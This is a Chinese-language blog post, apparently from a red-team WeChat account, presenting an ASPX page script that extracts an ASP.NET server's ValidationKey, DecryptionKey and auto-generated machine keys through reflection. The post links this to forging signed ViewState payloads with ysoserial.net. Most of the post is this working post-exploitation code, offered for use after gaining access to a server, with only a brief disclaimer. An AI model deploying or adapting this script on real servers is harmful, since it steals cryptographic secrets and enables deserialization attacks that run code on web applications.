#  SharpViewStateShell v1.0.2

原创 Rcoil [ RowTeam ](javascript:void\(0\);)

**RowTeam** ![]()

微信号 RowTeam

功能介绍 没有什么好介绍的消遣地

____

___发表于_

收录于合集

  

只要知道 ASP.NET 中关于 ViewState 的 `ValidationKey` 和 `ValidationAlg`
，那么我们根据它反序列化函数中的判断，只需要从 ysoserial.net 扣取对应的签名过程即可。

获取  `ValidationKey` 和 `ValidationAlg` 的脚本为：  

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    <%@ Import Namespace="System.Diagnostics" %><%@ Import Namespace="System.IO" %><script runat="server" language="c#" CODEPAGE="65001">  
        public void GetAutoMachineKeys()    {        var netVersion = Microsoft.Win32.Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v4\\Full\\", "Version", Microsoft.Win32.RegistryValueKind.ExpandString);         if(netVersion!=null)             Response.Write("<b>NetVersion: </b>" + netVersion);             Response.Write("<br/><hr/>");        // ==========================================================================        var systemWebAsm = System.Reflection.Assembly.Load("System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a");        var machineKeySectionType = systemWebAsm.GetType("System.Web.Configuration.MachineKeySection");        var getApplicationConfigMethod = machineKeySectionType.GetMethod("GetApplicationConfig", System.Reflection.BindingFlags.Static | System.Reflection.BindingFlags.NonPublic);        var config = (System.Web.Configuration.MachineKeySection)getApplicationConfigMethod.Invoke(null, new object[0]);        Response.Write("<b>ValidationKey:</b> "+config.ValidationKey);        Response.Write("<br/>");        Response.Write("<b>ValidationAlg:</b> "+ config.Validation);        Response.Write("<br/>");        Response.Write("<b>DecryptionKey:</b> "+ config.DecryptionKey);        Response.Write("<br/>");        Response.Write("<b>DecryptionAlg:</b> "+ config.Decryption);        Response.Write("<br/>");        Response.Write("<b>CompatibilityMode:</b> "+config.CompatibilityMode);         Response.Write("<br/><hr/>");        // ==========================================================================        var typeMachineKeyMasterKeyProvider = systemWebAsm.GetType("System.Web.Security.Cryptography.MachineKeyMasterKeyProvider");        var instance = typeMachineKeyMasterKeyProvider.Assembly.CreateInstance(            typeMachineKeyMasterKeyProvider.FullName, false,            System.Reflection.BindingFlags.Instance | System.Reflection.BindingFlags.NonPublic,            null, new object[] { config, null, null, null, null }, null, null);        var validationKey = typeMachineKeyMasterKeyProvider.GetMethod("GetValidationKey").Invoke(instance, new object[0]);        byte[] _validationKey = (byte[])validationKey.GetType().GetMethod("GetKeyMaterial").Invoke(validationKey, new object[0]);        var encryptionKey = typeMachineKeyMasterKeyProvider.GetMethod("GetEncryptionKey").Invoke(instance, new object[0]);        byte[] _decryptionKey = (byte[])validationKey.GetType().GetMethod("GetKeyMaterial").Invoke(encryptionKey, new object[0]);        // ==========================================================================        Response.Write("<br/><b>ASP.NET 4.0 and below:</b><br/>");        byte[] autogenKeys = (byte[])typeof(HttpRuntime).GetField("s_autogenKeys", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static).GetValue(null);        int validationKeySize = 64;        int decryptionKeySize = 24;        byte[] validationKeyAuto = new byte[validationKeySize];        byte[] decryptionKeyAuto = new byte[decryptionKeySize];        System.Buffer.BlockCopy(autogenKeys, 0, validationKeyAuto, 0, validationKeySize);        System.Buffer.BlockCopy(autogenKeys, validationKeySize, decryptionKeyAuto, 0, decryptionKeySize);        string appName = HttpRuntime.AppDomainAppVirtualPath;        string appId = HttpRuntime.AppDomainAppId;        Response.Write("<br/>");        Response.Write("<b>appName:</b> "+appName);        Response.Write("<br/>");        Response.Write("<b>appId:</b> "+appId);        Response.Write("<br/>");        Response.Write("<b>initial validationKey (not useful for direct use):</b> ");        Response.Write(BitConverter.ToString(validationKeyAuto).Replace("-", string.Empty));        Response.Write("<br/>");        Response.Write("<b>initial decryptionKey (not useful for direct use):</b> ");        Response.Write(BitConverter.ToString(decryptionKeyAuto).Replace("-", string.Empty));        Response.Write("<br/>");  
            byte[] _validationKeyAutoAppSpecific = validationKeyAuto.ToArray();        int dwCode3 = StringComparer.InvariantCultureIgnoreCase.GetHashCode(appName);        _validationKeyAutoAppSpecific[0] = (byte)(dwCode3 & 0xff);        _validationKeyAutoAppSpecific[1] = (byte)((dwCode3 & 0xff00) >> 8);        _validationKeyAutoAppSpecific[2] = (byte)((dwCode3 & 0xff0000) >> 16);        _validationKeyAutoAppSpecific[3] = (byte)((dwCode3 & 0xff000000) >> 24);        Response.Write("<b>App specific ValidationKey (when uses IsolateApps):</b> ");        Response.Write(BitConverter.ToString(_validationKeyAutoAppSpecific).Replace("-", string.Empty));        Response.Write("<br/>");  
            byte[] _validationKeyAutoAppIdSpecific = validationKeyAuto.ToArray();        int dwCode4 = StringComparer.InvariantCultureIgnoreCase.GetHashCode(appId);        _validationKeyAutoAppIdSpecific[4] = (byte)(dwCode4 & 0xff);        _validationKeyAutoAppIdSpecific[5] = (byte)((dwCode4 & 0xff00) >> 8);        _validationKeyAutoAppIdSpecific[6] = (byte)((dwCode4 & 0xff0000) >> 16);        _validationKeyAutoAppIdSpecific[7] = (byte)((dwCode4 & 0xff000000) >> 24);        Response.Write("<b>AppId Auto specific ValidationKey (when uses IsolateByAppId):</b> ");        Response.Write(BitConverter.ToString(_validationKeyAutoAppIdSpecific).Replace("-", string.Empty));        Response.Write("<br/>");  
            byte[] _decryptionKeyAutoAutoAppSpecific = decryptionKeyAuto.ToArray();        _decryptionKeyAutoAutoAppSpecific[0] = (byte)(dwCode3 & 0xff);        _decryptionKeyAutoAutoAppSpecific[1] = (byte)((dwCode3 & 0xff00) >> 8);        _decryptionKeyAutoAutoAppSpecific[2] = (byte)((dwCode3 & 0xff0000) >> 16);        _decryptionKeyAutoAutoAppSpecific[3] = (byte)((dwCode3 & 0xff000000) >> 24);        Response.Write("<b>App specific DecryptionKey (when uses IsolateApps):</b> ");        Response.Write(BitConverter.ToString(_decryptionKeyAutoAutoAppSpecific).Replace("-", string.Empty));        Response.Write("<br/>");  
            byte[] _decryptionKeyAutoAutoAppIdSpecific = decryptionKeyAuto.ToArray();        _decryptionKeyAutoAutoAppIdSpecific[4] = (byte)(dwCode4 & 0xff);        _decryptionKeyAutoAutoAppIdSpecific[5] = (byte)((dwCode4 & 0xff00) >> 8);        _decryptionKeyAutoAutoAppIdSpecific[6] = (byte)((dwCode4 & 0xff0000) >> 16);        _decryptionKeyAutoAutoAppIdSpecific[7] = (byte)((dwCode4 & 0xff000000) >> 24);        Response.Write("<b>AppId Auto specific DecryptionKey (when uses IsolateByAppId):</b> ");        Response.Write(BitConverter.ToString(_decryptionKeyAutoAutoAppIdSpecific).Replace("-", string.Empty));        Response.Write("<br/><hr/>");        // ==========================================================================        Response.Write("<br/><b>ASP.NET 4.5 and above:</b><br/>");        Response.Write("<br/>");        Response.Write("<b>validationAlg:</b> "+config.Validation);        Response.Write("<br/>");        Response.Write("<b>validationKey:</b> "+BitConverter.ToString(_validationKey).Replace("-", string.Empty));        Response.Write("<br/>");        Response.Write("<b>decryptionAlg:</b> "+config.Decryption);        Response.Write("<br/>");        Response.Write("<b>decryptionKey:</b> "+BitConverter.ToString(_decryptionKey).Replace("-", string.Empty));        Response.Write("<br/><hr/>");    }  
        public void Page_load()    {        Response.ContentEncoding = System.Text.Encoding.Default;        Response.Write("<p style='color:#ff0000;text-align:center;'>获取 .NET 框架的机器密钥</p>");        Response.Write("<p>1. 本程序仅供实验学习 ASP.NET ViewState，请勿违法滥用！</p>");        Response.Write("<p>2. 适用场景：获取 .NET 框架权限后均适用！</p>");        Response.Write("<p>3. 公众号：RowTeam</p>");        Response.Write("<br/><hr/>");        GetAutoMachineKeys();    }</script>

  

全程只靠图。  

  

![](https://gitee.com/fuli009/images/raw/master/public/20230401182314.png)

  

  

效果如下所示：  

  

![](https://gitee.com/fuli009/images/raw/master/public/20230401182315.png)

  

  

  

  

  

预览时标签不可点

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

